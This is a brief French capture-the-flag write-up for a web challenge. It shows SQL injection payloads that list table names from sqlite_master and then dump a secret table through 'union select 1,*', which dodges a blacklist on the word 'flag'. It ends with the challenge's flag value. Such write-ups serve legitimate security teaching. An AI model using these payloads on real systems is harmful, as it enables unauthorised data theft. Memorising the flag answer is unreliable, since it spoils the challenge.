# SQL injection 8

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Ce huitième et dernier défi d'injection SQL, on utilise le même code backend que celui du défi SQL injection 6. Il y a une table secrète qui contient une colonne "flag". Cependent, le mot "flag" est dans la blacklist. Il est complètement interdit. En d'autres termes, la requête SQL ne sera pas exécutée du tout si le mot est détecté. 

## Setup

Requirements:
- BurpSuite

# Writeup

Nom de la table:
`" union select 1,2,name from sqlite_master--`

Résultat: cKretTblName

Donc, on l'utilise dans la requête suivante: 
`" union select 1,* from cKretTblName--`

Dans ce cas, `1,*` deviendra `1, id, flag`. Comme `flag` est dans le dernier champs, c'est lui qui sera utilisé comme mot de passe.

Le flag obtenu: `FLAG-a7541918ece21a8dc17a3dc9bae1f23bYoureTheBoss`
